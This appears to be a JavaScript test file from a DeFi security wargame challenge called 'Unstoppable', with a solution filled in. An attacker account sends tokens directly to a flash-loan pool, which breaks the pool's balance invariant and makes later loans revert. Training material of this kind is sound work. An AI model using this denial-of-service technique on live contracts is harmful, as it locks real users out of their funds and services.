const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens = 10**24
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        //*** 3 addresses 
        [deployer, attacker, someUser] = await ethers.getSigners();
        console.log("deployer: ", deployer.address);
        console.log("attacker: ", attacker.address);
        console.log("someUser: ", someUser.address);

        //*** Token and Lender deployed by deployer address
        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        //// Contracts objects obtained from above contractFactories 
        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        //*** Token contract has been deployed by deployer, thus msg.sender of the transaction here
        //*** is by default deployer
        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        //*** 100 token are given to attacker
        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
        console.log("attacker balance: ", ethers.utils.formatEther( await this.token.balanceOf(attacker.address)));

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        this.token.connect(attacker).transfer(this.pool.address, 10);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
